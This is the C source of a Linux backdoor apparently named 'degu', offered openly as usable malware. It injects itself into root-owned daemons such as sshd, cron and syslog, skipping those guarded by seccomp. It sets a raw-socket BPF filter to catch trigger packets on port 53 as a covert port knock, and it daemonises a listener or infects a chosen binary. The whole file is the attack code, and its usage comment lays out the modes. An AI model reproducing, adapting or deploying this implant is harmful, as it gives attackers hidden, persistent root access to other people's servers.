#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <linux/filter.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <sys/stat.h>
#include <dirent.h>
#include <inttypes.h>
#include <errno.h>
#include "degu.h"

static int sock = -1;
static int run = 1;

#define CANDSIZE 11
char *candidate[CANDSIZE]= {
    "udev",
    "cron",
    "udisksd",
    "syslog",
    "containerd",
    "sshd",
    "getty",
    "agetty",
    "dhcp",
    "master",
    NULL
};

int isnum(char entry[]){
    for (int i = 0; entry[i]!= '\0' && entry[i]!= '\n'; i++){
        unsigned int t = (unsigned int)(entry[i]);
        if ( t < 48 || t > 57 )
            return 0;              
    }
    return 1;
}

int check_deletedlibs(char *pid){
    int ret = 0;
    char maps[512] = {0};
    char line[2048] = {0};
    sprintf(maps,"/proc/%s/maps",pid);
    FILE *f = fopen(maps,"r");
    if( f == NULL ) 
        return 1;
    while( fgets(line,2048,f) ) {
        if(strstr(line,"(deleted)") != NULL )
            ret = 1;
    }
    fclose(f);
    return ret;
}

int check_seccomp(char* pid){
    char line[1024] = {0};
    int seccomp = 0;
    int seccompf = 0;
    char status[512] = {0};
    sprintf(status,"/proc/%s/status",pid);
    FILE *f = fopen(status,"r");
    if( f == NULL ) return 1;
    while( fgets(line,1024,f) ) {
        if (strncmp("Seccomp_",line,8) == 0 ){
            char *tok = strtok(line, "\t");
            while(tok != NULL) {
                if(isnum(tok) == 1 )
                    seccompf = atoi(tok);
                tok = strtok(NULL, "\t");
            }
        }
        
        if (strncmp("Seccomp:",line,8) == 0 ){
            char *tok = strtok(line, "\t");
            while(tok != NULL) {
                if(isnum(tok) == 1 )
                    seccomp = atoi(tok);
                tok = strtok(NULL, "\t");
            }
        }
    }
    fclose(f);
    if (seccompf > 1 )
        return 1;
    if (seccomp > 2 )
        return 1;
    return 0;
}

void findproc(){
    DIR *procfs = NULL;
    procfs = opendir("/proc");
    if (procfs == NULL){
        TRACE("no procfs ?!");
        return;
    }

    struct dirent *entry = NULL;
    while( (entry=readdir(procfs)) ){
        if (isnum(entry->d_name)){
            char *pid = entry->d_name;

            char link[512] = {0};
            sprintf(link,"/proc/%s/exe",pid);

            char buf[4096]={0}; // no max path ftl
            int ret = readlink(link,buf,4096);

            if(ret != -1){
                struct stat sb;
                char maps[512] = {0};
                sprintf(maps,"/proc/%s",pid);
                ret = stat(maps,&sb);
                if (ret == 0){
                    if (sb.st_uid == 0 && strlen(pid) != 1 ){
                        int i=0;
                        while(candidate[i] != NULL){
                            if (strstr( buf, candidate[i] )){
                                TRACE("checking exe=%s pid=%s",buf,pid);
                                if ( (check_seccomp(pid) == 1) || (check_deletedlibs(pid) == 1) ){
                                    i++;
                                    continue;
                                }
                                char dso[4096] =  {0};
                                readlink("/proc/self/exe",dso,4096);
                                pid_t target = atoi(pid);
                                TRACE("injecting into %i",target);
                                int ret = inject(target,dso);
                                if (ret == 0)
                                    _exit(0);
                            }
                            i++;
                        }
                    }
                }
            }
        }
    }
    closedir(procfs);
    printf("┌∩┐\n");
}

int ghost_listen(){

    int s  = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if(s == -1 ){
        TRACE("[-] sock raw: %i %s", sock, strerror(errno));
        return -1;
    }

    struct sock_fprog filter;
    struct sock_filter BPF_code[] = {
        { 0x28, 0, 0, 0x0000000c },
        { 0x15, 0, 12, 0x00000800 },
        { 0x30, 0, 0, 0x00000017 },
        { 0x15, 0, 10, 0x00000011 },
        { 0x28, 0, 0, 0x00000014 },
        { 0x45, 8, 0, 0x00001fff },
        { 0xb1, 0, 0, 0x0000000e },
        { 0x48, 0, 0, 0x0000000e },
        { 0x15, 2, 0, 0x00000035 },
        { 0x48, 0, 0, 0x00000010 },
        { 0x15, 0, 3, 0x00000035 },
        { 0x80, 0, 0, 0x00000000 },
        { 0x35, 0, 1, PKTLEN_TRIGG },
        { 0x6, 0, 0, 0x00040000 },
        { 0x6, 0, 0, 0x00000000 },
    };

    filter.len = 15;
    filter.filter = BPF_code;

    if(setsockopt(s, SOL_SOCKET, SO_ATTACH_FILTER, &filter, sizeof(filter)) < 0) {
        TRACE("[-] bpf failed: %i %s\n", s, strerror(errno));
        run = 0;
        return -1;
    }
    return s;
}

void sig_alrm(int signum){

    if(run == 1)
        signal(SIGALRM,sig_alrm);

    alarm(WAKE);
    if(sock < 0)
        sock = ghost_listen();

    unsigned char p[1500] = {0};
    int i = 0;
    while( i != -1 ){
        i = recvfrom(sock, &p, 1500, MSG_DONTWAIT, NULL, NULL );
        if (i > PKTLEN_TRIGG )
            knock(p,i);
    }
}


DEGU_FUNC_INIT void degu(){

    if( getenv(PRELOAD) != NULL ){
        int port = 0;
        
        if (getuid() == 0)
            port=53;
        
        if (getenv(PORT) != NULL)
            port = atoi(getenv(PORT));

        if(port == 0 )
            return;

        pid_t pid = fork();
        if (pid == 0) {
            setsid();
            pid_t pid2 = fork();
            if (pid2 == 0) {
                setsid();
                parasite(port, 1);
            }
        }
        exit(EXIT_FAILURE);
    }
    
    if ( getenv(LIB_BYPASS) != NULL )
        return;

    if(getuid() == 0){
        setup_keys();
        signal(SIGALRM,sig_alrm);
        alarm(WAKE);
    }
}


/**
 * Command usage
 
  # ./degu.so
    uid == 0 && findproc
  
  # ./degu.so <pid>
    uid == 0 && pid to inject

  #/$ ./degu.so <port> <bin>
  uid == 0/1000 && port && bin to infect

  $ ./degu.so <port>
  uid == 1000 && port to listen to

 * 
 * 
 * 
 * 
 */

int main(int argc,char *argv[]){
    
    char *bypass = getenv(LIB_BYPASS);

    if ((bypass == NULL ) && (getuid() == 0)){
        
        if (argc == 1){
            findproc();
        }else if (argc == 2){         
            char dso[4096] =  {0};
            readlink("/proc/self/exe",dso,4096);
            char *pid = argv[1];
            TRACE("trying injecting pid %s  ",pid);
            pid_t target = atoi(pid);
            
            if ( check_seccomp(pid) == 1 ){
                printf(":/\n"); 
                exit(-103); 
            }
            if ( check_deletedlibs(pid) == 1){
                printf(":\\\n");
                exit(-104); 
            }
            TRACE("%s %i",dso,target);
            
            int fail = inject(target,dso);
            exit(fail); 
        }
    }
    if (bypass == NULL ){
        if (argc == 3){
            TRACE("trying usereffort ");
            int port = atoi(argv[1]);
            if (port < 1024)
                exit(EXIT_FAILURE);
            char *bin = strdup(argv[2]);
            usereffort(port,bin);
            exit(EXIT_SUCCESS); 
        }else if(argc == 2 ){
            int port = atoi(argv[1]);
            if (port < 1024)
                exit(EXIT_FAILURE);
            pid_t pid = fork();
            if (pid == 0) {
                setsid();
                pid_t pid2 = fork();
                if (pid2 == 0) {
                    setsid();
                    parasite(port, 1);
                }
                exit(EXIT_SUCCESS);
            }
            exit(EXIT_SUCCESS);
        } else {
            exit(EXIT_FAILURE); 
        }
    }
}
